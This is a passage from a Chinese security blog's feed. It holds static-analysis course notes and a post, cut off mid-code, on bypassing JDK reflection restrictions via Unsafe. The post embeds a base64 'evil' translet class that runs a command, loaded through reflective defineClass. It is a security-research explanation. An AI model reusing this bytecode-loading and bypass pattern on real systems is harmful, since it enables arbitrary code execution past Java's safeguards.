style="color:#000000;">可能引入过多变量和φ函数</font></li><li><font style="color:#000000;">可能造成机器码生成效率低下</font></li></ul></li></ul><h2 id="Basic-Blocks"><a href="#Basic-Blocks" class="headerlink" title="Basic Blocks"></a>Basic Blocks</h2><p><font style="color:#000000;">Basic Block指的是一个连续、最长的3AC序列，该序列具有以下特性：</font></p><ul><li><strong><font style="color:#000000;">控制流只能从该序列的起始指令进入</font></strong></li><li><strong><font style="color:#000000;">控制流只能从该序列的最后一条指令退出</font></strong></li></ul><p><font style="color:#000000;">那么针对一段3AC，如何将其划分成不同的Basic Block呢？根据Basic Block的定义，不难构造如下的算法来划分Basic Block。</font></p><p><font style="color:#000000;">确定3AC序列中的leaders，leaders包括具有以下特性的指令：</font></p><ul><li><font style="color:#000000;">3AC序列中的第一条指令</font></li><li><font style="color:#000000;">所有有条件跳转或无条件跳转的所有目标指令</font></li><li><font style="color:#000000;">所有有条件跳转或无条件跳转后面的一条指令</font></li></ul><p><font style="color:#000000;">构建3AC序列的BB：</font></p><ul><li><font style="color:#000000;">BB包含leader指令及其后面紧邻的所有非leader指令</font></li></ul><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730003760922-b663a8b6-e2c5-49e2-8f0f-453e6a07b4d5.png"></p><p><font style="color:#000000;">下图是一个3AC划分为不同的Basic Block的结果。</font></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730008032177-852866e9-d06a-40b6-806b-b8127b8851f9.png"></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730003894313-c12ab365-ecdf-40bf-9f0f-909b03e9b5c8.png"></p><h2 id="Control-Flow-Graphs"><a href="#Control-Flow-Graphs" class="headerlink" title="Control Flow Graphs"></a>Control Flow Graphs</h2><p><font style="color:#000000;">除了Basic Block，Control Flow Graphs中还会有块到块的边。在划分好Basic Block的基础上，可以构建CFG。CFG具有如下特性：</font></p><ul><li><strong><font style="color:#000000;">The nodes of CFG are basic blocks</font></strong></li><li><font style="color:#000000;">There is an edge from block A to block B if and only if</font><ul><li><strong><font style="color:#000000;">There is a conditional or unconditional jump from the end of A to the beginning of B</font></strong><font style="color:#000000;">（A的末尾有一条指向了B开头的有条件或无条件跳转指令）</font></li><li><strong><font style="color:#000000;">B immediately follows A in the original order of instructions and A does not end in an unconditional jump</font></strong><font style="color:#000000;">（B是A后面的紧邻块且A最后一条指令不是无条件跳转）</font></li></ul></li></ul><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730008612798-50159c1e-a71e-43be-8c0d-6c54381a3b34.png"></p><ul><li><strong><font style="color:#000000;">It is normal to replace the jumps to instruction labels by jumps to basic blocks</font></strong><font style="color:#000000;">（将原来3AC序列中的所有“跳转到某指令标签处”改为“跳转到某基本块处”）</font></li></ul><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730009210921-6d7355ed-8a0a-4615-91a3-4b7943c2e5b6.png"></p><p><font style="color:#000000;">根据上文CFG的特性，下图是在划分好Basic Block的基础上构建的CFG。</font></p><ul><li><font style="color:#000000;">在A-&gt;B中，A是B的前驱（predecessor），B是A的后继（successor）</font></li><li><font style="color:#000000;">除了构建好的Basic Block，还会额外添加两个结点，入口（Entry）和出口（Exit）</font><ul><li><font style="color:#000000;">这两个结点不对应任何IR</font></li><li><font style="color:#000000;">入口有一条边指向IR中的第一条指令当某个Basic Block的最后一条指令会让程序离开这段IR，则该Basic Block会有一条边指向出口</font></li></ul></li></ul><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730009536856-01268634-e6fe-4613-a7c6-ab1a2d3c57a0.png"></p>]]></content>
      
      
      <categories>
          
          <category> 静态代码分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态代码分析 </tag>
            
            <tag> 南大软分学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南大软分学习笔记-Introduction</title>
      <link href="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/"/>
      <url>/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/</url>
      
        <content type="html"><![CDATA[<h2 id="Programming-Languages"><a href="#Programming-Languages" class="headerlink" title="Programming Languages"></a>Programming Languages</h2><p><strong><font style="color:#000000;">静态程序分析</font></strong><font style="color:#000000;">是</font><strong><font style="color:#000000;">编程语言</font></strong><font style="color:#000000;">中应用层面下的一个细分领域，它是一个非常重要的核心内容。</font></p><p><font style="color:#000000;">Programming Languages可以大致分为三个部分：</font></p><ul><li><strong><font style="color:#000000;">在理论部分</font></strong><font style="color:#000000;">，考虑的是如何设计一个语言的语法和语义，如何设计语言的类型系统等等问题。</font></li><li><strong><font style="color:#000000;">在环境部分</font></strong><font style="color:#000000;">，由于已经有了语言的语法、语义和类型系统，需要支撑语言的运行，因此需要考虑如何为运行中的程序提供运行时环境，即如何设计编译器，在运行时需要怎样的支持（如内存的分配管理）等等。</font></li><li><strong><font style="color:#000000;">在应用部分</font></strong><font style="color:#000000;">，则需要关注如何保证语言所写出程序的效率、安全性和可靠性，主要考虑如何对程序进行分析，验证和合成（如何自动合成一个程序）。</font></li></ul><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729694621188-c5cda1e1-c406-467e-996e-ebb32820f71c.png"></p><h2 id="Background-Challenge"><a href="#Background-Challenge" class="headerlink" title="Background &amp; Challenge"></a>Background &amp; Challenge</h2><p><font style="color:#000000;">Background: In the last decade, the language cores had few changes, but </font><strong><font style="color:#000000;">the programs became significantly larger and more complicated</font></strong><font style="color:#000000;">.</font></p><p><font style="color:#000000;">Challenge: How to ensure the </font><strong><font style="color:#000000;">reliability, security and other promises</font></strong><font style="color:#000000;"> of large-scale and complex programs?</font></p><h2 id="Necessity"><a href="#Necessity" class="headerlink" title="Necessity"></a>Necessity</h2><ul><li><strong><font style="color:#000000;">提高程序可靠性</font></strong><font style="color:#000000;">：空指针引用，内存泄漏等。</font></li><li><strong><font style="color:#000000;">提高程序安全性</font></strong><font style="color:#000000;">：隐私信息泄露、注入攻击等。</font></li><li><strong><font style="color:#000000;">编译优化</font></strong><font style="color:#000000;">：消除程序死代码（不会对程序执行结果产生影响的代码）、代码移动（通过重新排列指令来提高程序的性能，通常发生在编译器的中间代码生成或优化阶段）等。</font></li><li><strong><font style="color:#000000;">提高程序可读性</font></strong><font style="color:#000000;">：集成开发环境（IDE）、代码调用层级（Call Hierarchy）、类型指示（Type Indication）等。</font></li></ul><h2 id="Static-Program-Analysis"><a href="#Static-Program-Analysis" class="headerlink" title="Static Program Analysis"></a>Static Program Analysis</h2><p><font style="color:#000000;">简单来说，静态分析就是通过分析程序来推断其行为，并在运行程序之前确定该程序是否满足某些属性。（Static analysis analyzes a program P to reason about its behaviors and determines whether it satisfies some properties before running P）例如：</font></p><ul><li><font style="color:#000000;">程序是否包含任何隐私信息泄露？</font></li><li><font style="color:#000000;">程序是否引用任何空指针？</font></li><li><font style="color:#000000;">程序中的所有强制转换操作是否安全？</font></li><li><font style="color:#000000;">程序中的指针1和指针2可以指向相同的内存位置吗？</font></li><li><font style="color:#000000;">程序中的某些断言语句会失败吗？</font></li><li><font style="color:#000000;">程序中的这段代码是死的吗（这样它就可以被消除）？</font></li></ul><blockquote><p><strong>Rice’s Theorem: Any non-trivial property of the behavior of programs in a r.e. language is undecidable.</strong></p></blockquote><p><font style="color:#000000;">Rice’s Theorem（莱斯定理）证明，对于任何非平凡的部分函数属性，不存在一种通用且有效的方法来决定一个算法是否计算具有该属性的部分函数。换句话说，</font><strong><font style="color:#000000;">没有有效的方法仅通过查看程序代码即可确定函数的非平凡属性</font></strong><font style="color:#000000;">（即上述示例中提到的空指针引用、隐私信息泄露等）。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729697168476-7b4c3be6-77ba-47b1-a1de-dffecce72a27.png"></p><p><font style="color:#000000;">进一步理解，在下图中，莱斯定理指出不存在一个Perfect Static Analysis（例如空指针问题中，Perfect Static Analysis指的就是能够准确地给出是否存在空指针漏洞，存在几个空指针漏洞等）。</font></p><p><strong><font style="color:#000000;">一个Perfect Static Analysis必须满足Sound又Complete</font></strong><font style="color:#000000;">。具体地说， Truth可以理解为程序中有N个空指针漏洞；Sound表示报告包含了所有的真实错误，但可能包含了误报的错误；Complete表示报告包含的错误都是真实的错误，但可能并未包含全部的错误。那么Sound、Truth和Complete之间的关系为</font><strong><font style="color:#000000;">Complete ⊆ Truth ⊆ Sound</font></strong><font style="color:#000000;">，Sound称之为over-approximate，Complete称之为under-approximate。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729697587651-51486139-8a8b-4d1d-a491-50045373b7bf.png"></p><p><font style="color:#000000;">既然不存在Perfect Static Analysis，即无法同时满足Sound和Complete，那么可以妥协其中一方，在某种程度上牺牲Sound或Complete中的一个，即Useful Static Analysis。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729698633761-e775ff4f-94e4-4861-8e7a-d42dcf385103.png"></p><p><font style="color:#000000;">在Useful Static Analysis中，妥协soundness，会造成false negatives（漏报）；妥协completeness，会造成false positives（误报）。</font></p><p><font style="color:#000000;">通常情况下，</font><strong><font style="color:#000000;">静态分析时总是选择牺牲completeness，保全soundness</font></strong><font style="color:#000000;">。即，宁可有误报，也不漏掉一个正确结果。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729698818693-ca38fd56-9d25-403a-a187-6a8af3e2e397.png"></p><p><font style="color:#000000;">那么为什么总选择保全Soundness呢？</font></p><ol><li><strong><font style="color:#000000;">Soundness is critical to a collection of important (static-analysis) applications</font></strong><font style="color:#000000;">, such as compiler optimization and program verification.</font></li><li><strong><font style="color:#000000;">Soundness is also preferable to other (static-analysis) applications for which soundness is not demanded</font></strong><font style="color:#000000;">, e.g., bug detection, as better soundness implies more bugs could be found.</font></li></ol><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p><font style="color:#000000;">在下图示例代码中，存在两种不同表述的分析结果：</font></p><ul><li><font style="color:#000000;">当input为true时，x等于1；当input为false时，x等于0。</font></li><li><font style="color:#000000;">x等于1或0。</font></li></ul><p><font style="color:#000000;">但是这两个分析都是sound的，区别在于，前者结果更精确，但是耗时长；后者结果不精确，但是速度快。因此，</font><strong><font style="color:#000000;">静态分析时通常需要尽力确保soundness，并在precision和speed之间做取舍</font></strong><font style="color:#000000;">。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729700169457-c6f3b9f4-e926-415a-8d4b-437b6c1348fc.png"></p><h2 id="Abstraction-Over-approximation"><a href="#Abstraction-Over-approximation" class="headerlink" title="Abstraction &amp; Over-approximation"></a><font style="color:#000000;">Abstraction &amp; Over-approximation</font></h2><p><font style="color:#000000;">大多数静态分析都可以用abstraction和over-approximation两个词概括，而后者又包含transfer functions和control flows。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729700566139-5c282687-b942-4130-b118-9d0e51bd5fdf.png"></p><p><strong><font style="color:#000000;">Abstraction是指将变量从concrete domain映射到abstract domain（符合集合）</font></strong><font style="color:#000000;">，方便后续处理。由于在程序中，变量很可能是不确定的（unknown）或非法、未定义（undefined）的。因此，</font><strong><font style="color:#000000;">abstract domain包含五类符号+−O⊤⊥，其中⊤表示unknown，⊥表示undefined</font></strong><font style="color:#000000;">。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729700963485-a209566c-c4dc-4c98-a746-3d93bc778435.png"></p><p><font style="color:#000000;">Over-approximation中的transfer functions定义了怎样在abstract values上对程序语句求值。transfer functions通常根据要分析的问题和程序语句相关的语义确定。对于算数运算，相关的transfer functions可以由算术运算规则和特性生成。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729701401089-9582fb6d-6dc7-4609-a4f4-cbff1e7f24cc.png"></p><p><font style="color:#000000;">Over-approximation中的control flows指的是，在实际场景中进行控制流相关的静态分析时，由于无法枚举所有路径，我们通常采用flow merging（一种over-approximation的方式）来处理。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729701339427-88fedb44-b37d-4690-88cf-476679c0d109.png"></p>]]></content>
      
      
      <categories>
          
          <category> 静态代码分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态代码分析 </tag>
            
            <tag> 南大软分学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unsafe绕过高版本JDK反射限制</title>
      <link href="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/"/>
      <url>/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:#000000;">从JDK8迁移到更高版本的JDK时，在安全性方面做了很大的提升，从JDK9开始引入的模块化系统，到JDK16进一步加强。JDK的强封装是一个重要的特性，它旨在提高JDK的安全性和可维护性，同时减少对非标准、内部JDK实现细节的依赖。</font><strong><font style="color:#000000;">JDK17及以后的版本默认对Java本身代码使用强封装</font></strong><font style="color:#000000;">（Strong Encapsulation），这意味着使用反射访问JDK内部API的代码将不再被允许，</font><strong><font style="color:#000000;">任何对java.*代码中的非公共字段和方法进行反射将抛出InaccessibleObjectException异常</font></strong><font style="color:#000000;">。</font></p><p><font style="color:#000000;">但是需要注意，</font><strong><font style="color:#000000;">sun.misc和sun.reflect包可供所有JDK版本（包括JDK17）中的工具和库进行反射</font></strong><font style="color:#000000;">。</font></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Java Version: &quot;</span> + System.getProperty(<span class="string">&quot;java.version&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilClassBase64</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAGwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA9DYWxjdWxhdG9yLmphdmEMAAcACAcAHAwAHQAeAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAfACABAApDYWxjdWxhdG9yAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvbGFuZy9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAACgAEAAsADQAMAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(evilClassBase64);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ((Class) method.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Calculator&quot;</span>, bytes, <span class="number">0</span>, bytes.length)).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在JDK8版本下，正常反射调用，且没有警告等信息。</font></p><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729614269491-8fcad471-fdae-4261-8df9-763ce3aff2f3.png"></p><p><font style="color:#000000;">在JDK9~JDK16版本下，正常反射调用，但是会出现警告信息。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WARNING: An illegal reflective access operation has occurred</span><br><span class="line">WARNING: Illegal reflective access by org.example.Main (file:/Users/alphag0/Desktop/Demo/target/classes/) to method java.lang.ClassLoader.defineClass(java.lang.String,<span class="type">byte</span>[],<span class="type">int</span>,<span class="type">int</span>)</span><br><span class="line">WARNING: Please consider reporting <span class="built_in">this</span> to the maintainers of org.example.Main</span><br><span class="line">WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations</span><br><span class="line">WARNING: All illegal access operations will be denied in a future release</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729614347238-e7fabd17-ba84-4bca-b553-3431205ae671.png"><font style="color:#000000;">在JDK17及以上版本下，反射调用失败，抛出异常java.lang.reflect.InaccessibleObjectException。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.reflect.InaccessibleObjectException: Unable to make <span class="keyword">protected</span> <span class="keyword">final</span> java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,<span class="type">byte</span>[],<span class="type">int</span>,<span class="type">int</span>) <span class="keyword">throws</span> java.lang.ClassFormatError accessible: <span class="keyword">module</span> java.base does not <span class="string">&quot;opens java.lang&quot;</span> to unnamed <span class="keyword">module</span> @4bde3f8a</span><br><span class="line">at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:<span class="number">354</span>)</span><br><span class="line">at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:<span class="number">297</span>)</span><br><span class="line">at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:<span class="number">199</span>)</span><br><span class="line">at java.base/java.lang.reflect.Method.setAccessible(Method.java:<span class="number">193</span>)</span><br><span class="line">at org.example.Main.main(Main.java:<span class="number">12</span>)</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729614453473-bebf93e8-a111-4402-bcae-c71eeac1335f.png"></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="Unsafe"><a href="#Unsafe" class="headerlink" title="Unsafe"></a><font style="color:rgb(51, 51, 51);background-color:rgb(253, 253, 253);">Unsafe</font></h3><p><font style="color:#000000;">Unsafe是位于sun.misc包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。但由于Unsafe类使Java语言拥有了类似C语言指针一样操作内存空间的能力，这无疑也增加了程序发生相关指针问题的风险。在程序中过度、不正确使用Unsafe类会使得程序出错的概率变大，使得Java这种安全的语言变得不再“安全”，因此对Unsafe的使用一定要慎重。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Unsafe</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Reflection.registerMethodsToFilter(Unsafe.class, Set.of(<span class="string">&quot;getUnsafe&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Unsafe</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Unsafe</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Unsafe</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> jdk.internal.misc.<span class="type">Unsafe</span> <span class="variable">theInternalUnsafe</span> <span class="operator">=</span> jdk.internal.misc.Unsafe.getUnsafe();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Provides the caller with the capability of performing unsafe</span></span><br><span class="line"><span class="comment">     * operations.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;The returned &#123;<span class="doctag">@code</span> Unsafe&#125; object should be carefully guarded</span></span><br><span class="line"><span class="comment">     * by the caller, since it can be used to read and write data at arbitrary</span></span><br><span class="line"><span class="comment">     * memory addresses.  It must never be passed to untrusted code.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;Most methods in this class are very low-level, and correspond to a</span></span><br><span class="line"><span class="comment">     * small number of hardware instructions (on typical machines).  Compilers</span></span><br><span class="line"><span class="comment">     * are encouraged to optimize these methods accordingly.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;Here is a suggested idiom for using unsafe operations:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;pre&gt; &#123;<span class="doctag">@code</span></span></span><br><span class="line"><span class="comment">     * class MyTrustedClass &#123;</span></span><br><span class="line"><span class="comment">     *   private static final Unsafe unsafe = Unsafe.getUnsafe();</span></span><br><span class="line"><span class="comment">     *   ...</span></span><br><span class="line"><span class="comment">     *   private long myCountAddress = ...;</span></span><br><span class="line"><span class="comment">     *   public int getCount() &#123; return unsafe.getByte(myCountAddress); &#125;</span></span><br><span class="line"><span class="comment">     * &#125;&#125;&lt;/pre&gt;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * (It may assist compilers to make the local variable &#123;<span class="doctag">@code</span> final&#125;.)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span>  SecurityException if the class loader of the caller</span></span><br><span class="line"><span class="comment">     *          class is not in the system domain in which all permissions</span></span><br><span class="line"><span class="comment">     *          are granted.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@CallerSensitive</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> &#123;</span><br><span class="line">        Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">        <span class="keyword">if</span> (!VM.isSystemDomainLoader(caller.getClassLoader()))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Unsafe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> theUnsafe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">使用Unsafe类时，可以通过两个方法获取其实例。</font></p><ul><li><font style="color:#000000;">从getUnsafe方法的使用限制条件出发，通过Java命令行命令-Xbootclasspath&#x2F;a把调用Unsafe相关方法的类A所在jar包路径追加到默认的bootstrap路径中，使得A被引导类加载器加载，从而通过Unsafe.getUnsafe方法安全的获取Unsafe实例。</font></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 其中path为调用Unsafe相关方法的类所在jar包路径</span></span><br><span class="line">java -Xbootclasspath/a: <span class="variable">$&#123;path&#125;</span></span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">通过反射获取单例对象theUnsafe。</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span 